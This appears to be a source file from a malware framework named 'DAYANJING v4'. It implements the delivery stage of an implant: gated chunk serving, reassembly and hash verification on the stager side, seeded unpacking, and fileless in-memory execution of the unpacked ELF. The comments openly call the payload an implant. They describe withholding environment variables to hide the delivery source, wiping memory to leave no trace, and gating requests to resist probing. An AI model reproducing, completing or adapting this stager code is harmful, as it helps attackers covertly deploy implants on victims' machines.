/* DAYANJING v4 — 25_deploy / src/drop.c
 *
 * 分块投递核心。平台无关、无网络、无系统调用 —— 因此可以完全单测。
 *
 * 摘要用 00_crypto 的 sha256，落地执行用 20_packer 的 pk_unpack_shaped
 * 与 pk_mexec。本层不发明摘要算法，也不发明执行方式。
 */

#include <stdlib.h>
#include <string.h>

#include "drop.h"
#include "crypto_hash.h"
#include "crypto_gcm.h"
#include "packer.h"

/* ------------------------------------------------------------------ */
/* manifest                                                            */
/* ------------------------------------------------------------------ */

int dp_manifest_build(const uint8_t *blob, size_t blob_len,
                      uint32_t chunk_size, dp_manifest_t *m)
{
    if (!blob || !m) return DP_ERR_ARG;
    if (blob_len == 0) return DP_ERR_ARG;
    if (chunk_size == 0 || chunk_size > DP_CHUNK_MAX) return DP_ERR_ARG;
    /* 总长必须能放进 uint32，且块数有上界。
       这里显式挡住静默截断：blob_len 超上界直接拒绝，不取模。 */
    if (blob_len > (size_t)DP_TOTAL_MAX) return DP_ERR_ARG;

    uint32_t total = (uint32_t)blob_len;
    uint32_t n = (total + chunk_size - 1u) / chunk_size;
    if (n == 0 || n > DP_MAX_CHUNKS) return DP_ERR_ARG;

    memset(m, 0, sizeof(*m));
    m->total      = total;
    m->chunk_size = chunk_size;
    m->nchunks    = n;
    sha256(blob, blob_len, m->digest);
    return DP_OK;
}

int dp_manifest_check(const dp_manifest_t *m)
{
    if (!m) return DP_ERR_ARG;
    if (m->total == 0) return DP_ERR_ARG;
    if (m->chunk_size == 0 || m->chunk_size > DP_CHUNK_MAX) return DP_ERR_ARG;
    if (m->nchunks == 0 || m->nchunks > DP_MAX_CHUNKS) return DP_ERR_ARG;
    if (m->total > DP_TOTAL_MAX) return DP_ERR_ARG;

    /* 块数必须与 total/chunk_size 自洽。
       不自洽的 manifest 会让组装器开出与实际写入量不符的缓冲，
       是缓冲区越界的源头之一。 */
    uint32_t expect = (m->total + m->chunk_size - 1u) / m->chunk_size;
    if (expect != m->nchunks) return DP_ERR_ARG;
    return DP_OK;
}

/* ------------------------------------------------------------------ */
/* 取块（服务端侧）                                                     */
/* ------------------------------------------------------------------ */

int dp_chunk_get(const uint8_t *blob, size_t blob_len,
                 const dp_manifest_t *m, uint32_t idx,
                 const uint8_t **out, size_t *olen)
{
    if (!blob || !m || !out || !olen) return DP_ERR_ARG;
    if (dp_manifest_check(m) != DP_OK) return DP_ERR_ARG;
    /* manifest 与 blob 必须对应。不校验的话，一份恶意 manifest
       可以让服务端把 blob 之外的内存当块发出去（越界读）。 */
    if ((size_t)m->total != blob_len) return DP_ERR_ARG;
    if (idx >= m->nchunks) return DP_ERR_RANGE;

    uint64_t off = (uint64_t)idx * (uint64_t)m->chunk_size;
    uint32_t remain = m->total - (uint32_t)off;
    uint32_t len = (remain < m->chunk_size) ? remain : m->chunk_size;

    *out  = blob + off;
    *olen = len;
    return DP_OK;
}

int dp_serve_chunk(const uint8_t *blob, size_t blob_len,
                   const dp_manifest_t *m, uint32_t idx,
                   dp_gate_fn gate, void *ud,
                   const uint8_t **out, size_t *olen)
{
    if (!gate) return DP_ERR_ARG;
    /* 门控在越界检查之前：对越界请求先过门控，避免给未授权来源
       回一个"越界"错误码，那本身就是信息泄露（可用来探测块数）。 */
    if (gate(idx, ud) == 0) return DP_ERR_GATE;
    return dp_chunk_get(blob, blob_len, m, idx, out, olen);
}

/* ------------------------------------------------------------------ */
/* 组装（stager 侧）                                                    */
/* ------------------------------------------------------------------ */

int dp_asm_init(dp_asm_t *a, const dp_manifest_t *m)
{
    if (!a || !m) return DP_ERR_ARG;
    if (dp_manifest_check(m) != DP_OK) return DP_ERR_ARG;

    memset(a, 0, sizeof(*a));
    a->buf = malloc(m->total);
    if (!a->buf) return DP_ERR_NOMEM;

    a->cap         = m->total;
    a->len         = 0;
    a->nchunks     = m->nchunks;
    a->chunk_size  = m->chunk_size;
    memcpy(a->digest, m->digest, DP_DIGEST_LEN);
    return DP_OK;
}

void dp_asm_free(dp_asm_t *a)
{
    if (!a) return;
    if (a->buf) {
        /* 制品内容在内存中，释放前清掉 —— 进程映像被替换后
           这块内存仍在地址空间里，不清等于把制品留在堆上。 */
        memset(a->buf, 0, a->cap);
        free(a->buf);
        a->buf = NULL;
    }
    memset(a, 0, sizeof(*a));
}

int dp_asm_put(dp_asm_t *a, uint32_t idx, const uint8_t *chunk, size_t clen)
{
    if (!a || !chunk) return DP_ERR_ARG;
    if (a->sealed) return DP_ERR_STATE;          /* 已 seal 后禁止再写 */
    if (!a->buf) return DP_ERR_ARG;
    if (idx >= a->nchunks) { a->bad_count++; return DP_ERR_RANGE; }

    /* 期望长度：最后一块可短。 */
    uint64_t off = (uint64_t)idx * (uint64_t)a->chunk_size;
    if (off > (uint64_t)a->cap) { a->bad_count++; return DP_ERR_RANGE; }
    uint32_t remain = a->cap - (uint32_t)off;
    uint32_t expect = (remain < a->chunk_size) ? remain : a->chunk_size;
    if (clen != (size_t)expect) { a->bad_count++; return DP_ERR_LEN; }

    /* 幂等：重复块不写入、不计数、不报错为失败之外的语义。
       重传在正常网络中就是会发生。 */
    uint32_t byte = idx / 8u, bit = idx % 8u;
    if (a->got[byte] & (uint8_t)(1u << bit)) { a->dup_count++; return DP_ERR_DUP; }

    memcpy(a->buf + off, chunk, clen);
    a->got[byte] |= (uint8_t)(1u << bit);
    a->got_count++;
    return DP_OK;
}

int dp_asm_is_complete(const dp_asm_t *a)
{
    if (!a || !a->buf) return 0;
    return (a->got_count == a->nchunks) ? 1 : 0;
}

uint32_t dp_asm_missing(const dp_asm_t *a)
{
    if (!a) return 0;
    if (a->nchunks < a->got_count) return 0;   /* 不应发生；防御性 */
    return a->nchunks - a->got_count;
}

int dp_asm_seal(dp_asm_t *a)
{
    if (!a || !a->buf) return DP_ERR_ARG;
    if (a->sealed) return DP_OK;               /* 幂等：重复 seal 无害 */
    if (!dp_asm_is_complete(a)) return DP_ERR_INCOMPLETE;

    uint8_t d[DP_DIGEST_LEN];
    sha256(a->buf, a->cap, d);
    if (crypto_constant_time_eq(d, a->digest, DP_DIGEST_LEN) == 0)
        return DP_ERR_DIGEST;

    a->len    = a->cap;
    a->sealed = 1;
    return DP_OK;
}

/* ------------------------------------------------------------------ */
/* 落块执行                                                            */
/* ------------------------------------------------------------------ */

int dp_asm_exec(const dp_asm_t *a, const uint8_t *seed, size_t seed_len)
{
    if (!a || !seed) return DP_ERR_ARG;
    /* 硬规则 2 的落点：未 seal 绝不执行。
       缺块却执行，现场表现为"制品随机跑飞"，无法定位。 */
    if (!a->sealed) return DP_ERR_INCOMPLETE;
    if (!a->buf || a->len == 0) return DP_ERR_ARG;

    /* 解包需要的是"原始长度"，而这里已知的只有"制品长度"。
       制品是压缩的，raw_len 恒大于 blob_len，且比例未知（实测约 1.9）。
       按 pk_size_bound_v4(blob_len) 分配必然不足 —— 那是打包上界，
       不是解包上界。故从 2 倍起翻倍重试，直到不再 NOMEM。 */
    size_t cap = (size_t)a->len * 2u + 65536u;
    size_t elf_len = 0;
    uint8_t *elf = NULL;
    int rc = PK_ERR_NOMEM;

    for (int attempt = 0; attempt < 8; attempt++) {
        elf = malloc(cap);
        if (!elf) return DP_ERR_NOMEM;

        elf_len = cap;
        rc = pk_unpack_shaped(a->buf, a->len, seed, seed_len, elf, &elf_len);
        if (rc == PK_OK) break;

        memset(elf, 0, cap);
        free(elf);
        elf = NULL;

        if (rc != PK_ERR_NOMEM) return DP_ERR_DIGEST;   /* 非容量问题，重试无意义 */
        if (cap > (size_t)1 << 30) return DP_ERR_NOMEM;
        cap *= 2u;
    }
    if (rc != PK_OK || !elf) return DP_ERR_DIGEST;

    /* pk_mexec 成功时不返回。返回即失败。
       argv/envp 显式传入空数组：制品是单体植入体，不接受外部参数，
       也不继承可能泄露投递来源的环境变量。 */
    static char *const empty_argv[] = { NULL };
    static char *const empty_envp[] = { NULL };
    rc = pk_mexec(elf, elf_len, empty_argv, empty_envp);
    memset(elf, 0, cap);
    free(elf);
    return (rc == 0) ? DP_OK : DP_ERR_STATE;
}
